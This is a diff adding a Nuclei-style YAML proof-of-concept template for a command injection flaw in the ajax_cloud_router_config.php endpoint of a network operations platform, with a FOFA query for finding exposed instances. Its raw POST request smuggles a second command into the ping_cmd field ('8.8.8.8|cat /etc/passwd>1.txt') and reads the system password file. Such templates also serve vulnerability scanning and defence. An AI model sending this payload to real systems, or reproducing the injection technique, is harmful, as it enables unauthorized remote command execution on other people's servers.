@@ -1,0 +1,24 @@
+id: poc-tstkf7gh50tgzpgs
+info:
+  name: 全息AI网络运维平台ajax_cloud_router_config.php存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tstkf7gh50tgzpgs'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tstkf7gh50tgzpgs
+    fofa: '"全息AI网络运维平台"'
+http:
+- raw:
+  - 'POST /nmss/cloud/Ajax/ajax_cloud_router_config.php HTTP/1.1
+
+    host：127.0.0.1
+
+
+    ping_cmd=8.8.8.8|cat /etc/passwd>1.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
